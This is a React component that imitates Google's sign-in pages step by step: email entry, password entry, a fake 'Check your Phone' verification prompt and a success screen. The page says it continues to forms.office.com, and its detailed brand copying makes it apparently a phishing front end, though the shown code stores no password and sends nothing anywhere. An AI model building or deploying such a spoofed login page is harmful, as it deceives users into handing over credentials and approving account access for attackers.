import { useState, useRef } from "react";

// ── Google "G" logo SVG ──
const GoogleG = ({ size = 24 }) => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width={size} height={size}>
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
    <path fill="none" d="M0 0h48v48H0z"/>
  </svg>
);

// ── Google-colored "Google" wordmark ──
const GoogleWordmark = ({ fontSize = 14, bold = false }) => (
  <span style={{ fontSize, fontWeight: bold ? 700 : 500, letterSpacing: 0 }}>
    <span style={{ color: "#4285F4" }}>G</span>
    <span style={{ color: "#EA4335" }}>o</span>
    <span style={{ color: "#FBBC05" }}>o</span>
    <span style={{ color: "#4285F4" }}>g</span>
    <span style={{ color: "#34A853" }}>l</span>
    <span style={{ color: "#EA4335" }}>e</span>
  </span>
);

const Spinner = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none"
    stroke="#fff" strokeWidth="2.5" width="18" height="18"
    style={{ animation: "spin 0.75s linear infinite" }}>
    <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
  </svg>
);

// ── Floating label input ──
function GField({ label, id, type = "text", value, onChange, error, autoFocus }) {
  const [focused, setFocused] = useState(!!autoFocus);
  const active = focused || value.length > 0;
  return (
    <div style={{ marginBottom: error ? 2 : 20 }}>
      <div style={{
        position: "relative",
        border: `${focused ? 2 : 1}px solid ${error ? "#c5221f" : focused ? "#1a73e8" : "#747775"}`,
        borderRadius: 4, height: 56, display: "flex", alignItems: "center",
        padding: "0 12px", background: "#fff", transition: "border-color 0.15s",
      }}>
        <label htmlFor={id} style={{
          position: "absolute", left: 12, pointerEvents: "none",
          top: active ? -10 : "50%",
          transform: active ? "translateY(0) scale(0.75)" : "translateY(-50%) scale(1)",
          transformOrigin: "left center",
          fontSize: 16, lineHeight: active ? "1.4" : "1",
          color: error ? "#c5221f" : focused ? "#1a73e8" : "#444",
          background: "#fff", padding: active ? "0 4px" : "0",
          transition: "all 0.15s cubic-bezier(0.4,0,0.2,1)", whiteSpace: "nowrap",
        }}>{label}</label>
        <input id={id} type={type} value={value} onChange={onChange}
          autoFocus={autoFocus}
          onFocus={() => setFocused(true)} onBlur={() => setFocused(false)}
          style={{
            width: "100%", border: "none", outline: "none",
            fontSize: 16, color: "#202124", background: "transparent",
            fontFamily: "inherit", padding: 0, marginTop: active ? 6 : 0,
          }}
        />
      </div>
      {error && <p style={{ color: "#c5221f", fontSize: 12, margin: "4px 12px 8px" }}>{error}</p>}
    </div>
  );
}

// ── Blue text link ──
function GLink({ children, onClick }) {
  const [hov, setHov] = useState(false);
  return (
    <button onClick={onClick} onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)}
      style={{
        background: hov ? "#e8f0fe" : "none", border: "none",
        color: "#1a73e8", fontSize: 14, fontWeight: 500,
        fontFamily: "inherit", cursor: "pointer",
        borderRadius: 4, padding: "10px 8px", transition: "background 0.15s",
      }}>{children}</button>
  );
}

// ── Blue pill button ──
function NextBtn({ onClick, loading, label = "Next" }) {
  const [hov, setHov] = useState(false);
  return (
    <button onClick={!loading ? onClick : undefined}
      onMouseEnter={() => setHov(true)} onMouseLeave={() => setHov(false)}
      style={{
        display: "flex", alignItems: "center", justifyContent: "center", gap: 6,
        background: hov ? "#1557b0" : "#1a73e8", color: "#fff",
        border: "none", borderRadius: 24, padding: "10px 28px",
        fontSize: 14, fontWeight: 500, fontFamily: "inherit",
        cursor: loading ? "wait" : "pointer", height: 40, minWidth: 88,
        transition: "all 0.15s",
      }}>
      {loading ? <Spinner /> : label}
    </button>
  );
}

// ── Language footer ──
function LangFooter() {
  return (
    <div style={{ padding: "12px 20px 16px", borderTop: "1px solid #e0e0e0", marginTop: "auto" }}>
      <select style={{ border: "none", background: "none", fontSize: 12, color: "#5f6368", fontFamily: "inherit", outline: "none", cursor: "pointer" }}>
        <option>English (United States)</option>
        <option>Español</option>
        <option>Português</option>
      </select>
    </div>
  );
}

/* ══════════════════════════════════════════
   PHASE 1 — Sign in (email)
══════════════════════════════════════════ */
function Phase1({ onNext }) {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");

  function next() {
    if (!email.trim()) return setError("Enter an email or phone number.");
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim())) return setError("Enter a valid email address.");
    setError(""); onNext(email.trim());
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", minHeight: "100%" }}>
      {/* Top bar */}
      <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "14px 20px", borderBottom: "1px solid #e0e0e0" }}>
        <GoogleG size={18} />
        <span style={{ fontSize: 14, color: "#202124" }}>Sign in with </span>
        <GoogleWordmark fontSize={14} bold />
      </div>

      {/* Body */}
      <div style={{ padding: "40px 28px 24px", flex: 1 }}>
        <h1 style={{ fontSize: 28, fontWeight: 400, color: "#202124", marginBottom: 8 }}>Sign in</h1>
        <p style={{ fontSize: 16, color: "#202124", marginBottom: 28 }}>
          to continue to <span style={{ color: "#1a73e8", fontWeight: 500 }}>forms.office.com</span>
        </p>

        <GField label="Email or phone" id="email" value={email}
          onChange={e => { setEmail(e.target.value); setError(""); }} error={error} autoFocus />

        <div style={{ marginTop: 4 }}>
          <GLink onClick={() => {}}>Forgot email?</GLink>
        </div>
      </div>

      {/* Bottom row */}
      <div style={{ padding: "0 20px 20px" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingTop: 16 }}>
          <GLink onClick={() => {}}>Create account</GLink>
          <NextBtn onClick={next} />
        </div>
      </div>

      <LangFooter />
    </div>
  );
}

/* ══════════════════════════════════════════
   PHASE 2 — Welcome (password)
══════════════════════════════════════════ */
function Phase2({ email, onBack, onNext }) {
  const [pw, setPw] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  async function next() {
    if (!pw) return setError("Enter a password.");
    setError(""); setLoading(true);
    await new Promise(r => setTimeout(r, 900));
    setLoading(false);
    onNext(pw);
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", minHeight: "100%" }}>
      {/* Top bar */}
      <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "14px 20px", borderBottom: "1px solid #e0e0e0" }}>
        <GoogleG size={18} />
        <span style={{ fontSize: 14, color: "#202124" }}>Sign in with </span>
        <GoogleWordmark fontSize={14} bold />
      </div>

      {/* Body */}
      <div style={{ padding: "40px 28px 24px", flex: 1 }}>
        <h1 style={{ fontSize: 28, fontWeight: 400, color: "#202124", marginBottom: 16 }}>Welcome</h1>

        {/* Email chip */}
        <div onClick={onBack} style={{
          display: "inline-flex", alignItems: "center", gap: 10,
          border: "1px solid #dadce0", borderRadius: 24,
          padding: "6px 14px 6px 8px", marginBottom: 32, cursor: "pointer",
        }}>
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#5f6368" width="22" height="22">
            <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
          </svg>
          <span style={{ fontSize: 14, color: "#202124" }}>{email}</span>
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#5f6368" width="16" height="16">
            <path d="M7 10l5 5 5-5z"/>
          </svg>
        </div>

        <GField label="Enter your password" id="password"
          type={showPw ? "text" : "password"}
          value={pw} onChange={e => { setPw(e.target.value); setError(""); }}
          error={error} autoFocus />

        <label style={{ display: "flex", alignItems: "center", gap: 10, fontSize: 14, color: "#202124", cursor: "pointer", userSelect: "none", marginTop: 4 }}>
          <input type="checkbox" checked={showPw} onChange={e => setShowPw(e.target.checked)}
            style={{ width: 16, height: 16, accentColor: "#1a73e8", cursor: "pointer" }} />
          Show password
        </label>
      </div>

      {/* Bottom row */}
      <div style={{ padding: "0 20px 20px" }}>
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", paddingTop: 16 }}>
          <GLink onClick={() => {}}>Forgot password?</GLink>
          <NextBtn onClick={next} loading={loading} />
        </div>
      </div>

      <LangFooter />
    </div>
  );
}

/* ══════════════════════════════════════════
   PHASE 3 — Verification
══════════════════════════════════════════ */
function Phase3({ email, onNext }) {
  const [loading, setLoading] = useState(false);

  async function next() {
    setLoading(true);
    await new Promise(r => setTimeout(r, 1000));
    setLoading(false);
    onNext();
  }

  return (
    <div style={{ display: "flex", flexDirection: "column", minHeight: "100%", padding: "32px 28px 24px" }}>

      {/* Google G logo top-left */}
      <div style={{ marginBottom: 24 }}>
        <GoogleG size={40} />
      </div>

      {/* Title */}
      <h1 style={{ fontSize: 28, fontWeight: 400, color: "#202124", textAlign: "center", marginBottom: 16 }}>
        Verification
      </h1>

      {/* Description */}
      <p style={{ fontSize: 16, color: "#202124", lineHeight: 1.6, marginBottom: 24 }}>
        To help keep your account safe, <GoogleWordmark fontSize={16} /> wants to make sure it's really you trying to sign in
      </p>

      {/* Email chip */}
      <div style={{
        display: "inline-flex", alignItems: "center", gap: 10,
        border: "1px solid #dadce0", borderRadius: 24,
        padding: "6px 16px 6px 8px", marginBottom: 32, width: "fit-content",
      }}>
        {/* Avatar circle with initial */}
        <div style={{
          width: 32, height: 32, borderRadius: "50%",
          background: "#f1f3f4", border: "1px solid #dadce0",
          display: "flex", alignItems: "center", justifyContent: "center",
          overflow: "hidden",
        }}>
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#5f6368" width="20" height="20">
            <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
          </svg>
        </div>
        <span style={{ fontSize: 15, color: "#202124" }}>{email}</span>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#5f6368" width="16" height="16">
          <path d="M7 10l5 5 5-5z"/>
        </svg>
      </div>

      {/* Phone illustration */}
      <div style={{ display: "flex", justifyContent: "center", marginBottom: 28 }}>
        <div style={{ position: "relative", width: 160, height: 200 }}>
          {/* Phone outline */}
          <div style={{
            position: "absolute", top: 0, left: "50%", transform: "translateX(-50%)",
            width: 110, height: 180,
            border: "2.5px solid #202124", borderRadius: 18,
            background: "#fff", display: "flex", flexDirection: "column",
            alignItems: "center", justifyContent: "center", gap: 10,
          }}>
            {/* Camera dot */}
            <div style={{ position: "absolute", top: 10, width: 6, height: 6, borderRadius: "50%", background: "#202124" }} />
            {/* Google wordmark inside phone */}
            <div style={{ marginTop: 10 }}>
              <GoogleWordmark fontSize={15} />
            </div>
            {/* Grey lines (content placeholder) */}
            <div style={{ width: 60, height: 6, background: "#e0e0e0", borderRadius: 3 }} />
            <div style={{ width: 45, height: 6, background: "#e0e0e0", borderRadius: 3 }} />
          </div>

          {/* X circle (bottom-left) */}
          <div style={{
            position: "absolute", bottom: 0, left: 0,
            width: 52, height: 52, borderRadius: "50%",
            border: "2px solid #202124", background: "#fff",
            display: "flex", alignItems: "center", justifyContent: "center",
          }}>
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke="#202124" strokeWidth="2.5" fill="none" width="24" height="24">
              <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
            </svg>
          </div>

          {/* Blue checkmark badge (bottom-right) */}
          <div style={{
            position: "absolute", bottom: 0, right: 0,
            width: 56, height: 56,
          }}>
            {/* Star/badge shape */}
            <svg viewBox="0 0 56 56" width="56" height="56" xmlns="http://www.w3.org/2000/svg">
              <path fill="#1a73e8" d="M28 2l5.5 8.5L44 6l1 11.5 11.5 1-4.5 10.5 4.5 10.5L45 40.5 44 52l-10.5-4.5L28 54l-5.5-6.5L12 52l-1-11.5L-.5 39.5 4 29 -.5 18.5 11 16.5 12 5l10.5 4.5z"/>
              <path fill="#1a73e8" d="M28 4 C28 4 28 4 28 4" />
            </svg>
            {/* Overlay circle with check */}
            <div style={{
              position: "absolute", top: 0, left: 0, width: "100%", height: "100%",
              display: "flex", alignItems: "center", justifyContent: "center",
            }}>
              {/* Blue starburst */}
              <div style={{
                width: 52, height: 52,
                background: "#1a73e8",
                clipPath: "polygon(50% 0%,61% 15%,79% 9%,79% 28%,97% 35%,85% 50%,97% 65%,79% 72%,79% 91%,61% 85%,50% 100%,39% 85%,21% 91%,21% 72%,3% 65%,15% 50%,3% 35%,21% 28%,21% 9%,39% 15%)",
                display: "flex", alignItems: "center", justifyContent: "center",
              }}>
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="3" width="22" height="22">
                  <polyline points="20 6 9 17 4 12"/>
                </svg>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Check your Phone */}
      <h2 style={{ fontSize: 22, fontWeight: 400, color: "#202124", marginBottom: 12 }}>
        Check your Phone
      </h2>
      <p style={{ fontSize: 15, color: "#202124", lineHeight: 1.6, marginBottom: 32 }}>
        <GoogleWordmark fontSize={15} /> sent a notification to your Phone. Tap <strong>Yes</strong> on the notification to verify it's you.
      </p>

      {/* Next button aligned right */}
      <div style={{ display: "flex", justifyContent: "flex-end", marginTop: "auto" }}>
        <NextBtn onClick={next} loading={loading} />
      </div>
    </div>
  );
}

/* ══════════════════════════════════════════
   PHASE 4 — Done
══════════════════════════════════════════ */
function PhaseDone({ email, onRestart }) {
  return (
    <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", minHeight: "100%", padding: 40, textAlign: "center" }}>
      <div style={{
        width: 72, height: 72, borderRadius: "50%", background: "#34A853",
        display: "flex", alignItems: "center", justifyContent: "center",
        fontSize: 36, color: "#fff", marginBottom: 20,
      }}>✓</div>
      <h2 style={{ fontSize: 22, fontWeight: 400, color: "#202124", marginBottom: 8 }}>Signed in successfully</h2>
      <p style={{ fontSize: 14, color: "#5f6368", marginBottom: 32 }}>{email}</p>
      <NextBtn onClick={onRestart} label="Sign out" />
    </div>
  );
}

/* ══════════════════════════════════════════
   ROOT
══════════════════════════════════════════ */
export default function App() {
  const [phase, setPhase] = useState(1);
  const [email, setEmail] = useState("");

  function restart() { setPhase(1); setEmail(""); }

  return (
    <>
      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; }
      `}</style>
      <div style={{
        minHeight: "100vh", background: "#f1f3f4",
        display: "flex", alignItems: "center", justifyContent: "center",
        fontFamily: "'Google Sans', Roboto, Arial, sans-serif",
        padding: "20px 16px",
      }}>
        <div style={{
          background: "#fff", borderRadius: 8,
          width: "100%", maxWidth: 430, minHeight: 580,
          boxShadow: "0 2px 6px 2px rgba(60,64,67,.15), 0 1px 2px 0 rgba(60,64,67,.3)",
          display: "flex", flexDirection: "column", overflow: "hidden",
        }}>
          {phase === 1 && <Phase1 onNext={e => { setEmail(e); setPhase(2); }} />}
          {phase === 2 && <Phase2 email={email} onBack={() => setPhase(1)} onNext={() => setPhase(3)} />}
          {phase === 3 && <Phase3 email={email} onNext={() => setPhase(4)} />}
          {phase === 4 && <PhaseDone email={email} onRestart={restart} />}
        </div>
      </div>
    </>
  );
}
